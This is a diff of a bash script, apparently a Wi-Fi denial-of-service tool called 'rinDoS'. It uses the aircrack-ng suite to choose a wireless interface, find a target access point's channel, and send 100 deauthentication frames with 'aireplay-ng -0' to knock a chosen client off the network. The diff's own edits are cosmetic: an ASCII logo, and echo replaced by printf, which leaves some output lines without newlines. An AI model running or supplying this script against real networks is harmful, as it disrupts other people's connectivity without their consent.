@@ -7,16 +7,16 @@ sudo mkdir /tmp/rdos/
 
 # ASCII art
 ascii_art() {
-printf "
-        __   _             _____        _____      _     
-       / /  (_)           |  __ \      / ____|    | |    
-      / / __ _ _ __   __ _| |  | | ___| (___   ___| |__  
-     / / '__| | '_ \ / _` | |  | |/ _ \\___ \ / __| '_ \ 
-  _ / /| |  | | | | | (_| | |__| | (_) |___) |\__ \ | | |
- (_)_/ |_|  |_|_| |_|\__, |_____/ \___/_____(_)___/_| |_|
-                      __/ |                              
-                     |___/   
-"
+cat << "EOF"
+       __   _             _____        _____      _        
+      / /  (_)           |  __ \      / ____|    | |       
+     / / __ _ _ __   __ _| |  | | ___| (___   ___| |__     
+    / / '__| | '_ \ / _` | |  | |/ _ \\___ \ / __| '_ \    
+ _ / /| |  | | | | | (_| | |__| | (_) |___) |\__ \ | | |   
+(_)_/ |_|  |_|_| |_|\__, |_____/ \___/_____(_)___/_| |_|   
+                      __/ |                                 
+                     |___/          
+EOF                        
 }
 
 
@@ -52,9 +52,12 @@ trap custom_interrupt SIGINT
 
 # Check for root
 if [ "$EUID" -ne 0 ]; then 
-    echo "Please run as root\n"
+    printf "Please run as root\n"
     sleep 2; custom_exit
 fi
+
+# Print logo art
+ascii_art
 
 # Check for aircrack-ng
 if which aircrack-ng | grep -q 'aircrack-ng'; then
@@ -72,15 +75,16 @@ else
     sleep 2; custom_exit
 fi
 
-# Clear screen
+# Clear screen and reprint art
 clear
+ascii_art
 
 # Get a list of wireless interfaces
 wireless_interfaces=($(iwconfig 2>/dev/null | grep -E '^[[:alnum:]]+\s+IEEE 802\.11' | awk '{print $1}'))
 
 # Check if there are no wireless interfaces
 if [ ${#wireless_interfaces[@]} -eq 0 ]; then
-    echo "No wireless interfaces found."
+    printf "No wireless interfaces found."
     exit 1
 fi
 
@@ -93,9 +97,9 @@ for interface in "${wireless_interfaces[@]}"; do
 done
 
 # Display the menu
-echo "Select a wireless interface:"
+printf "Select a wireless interface:"
 for key in "${!interface_map[@]}"; do
-    echo "$key: ${interface_map[$key]}"
+    printf "$key: ${interface_map[$key]}"
 done
 
 # Prompt the user for their choice
@@ -105,7 +109,7 @@ read -p "Enter the number of the wireless interface you want to use: " choice
 if [[ -n ${interface_map[$choice]} ]]; then
     ITMP="${interface_map[$choice]}"
 else
-    echo "Invalid choice. Please enter a valid number."
+    printf "Invalid choice. Please enter a valid number."
     custom_exit
 fi
 
@@ -159,7 +163,7 @@ CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = g
 printf "Setting the monitor channel to the same channel the target AP is on..."
 sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
-sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF
+sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF 
 custom_exit
 
 
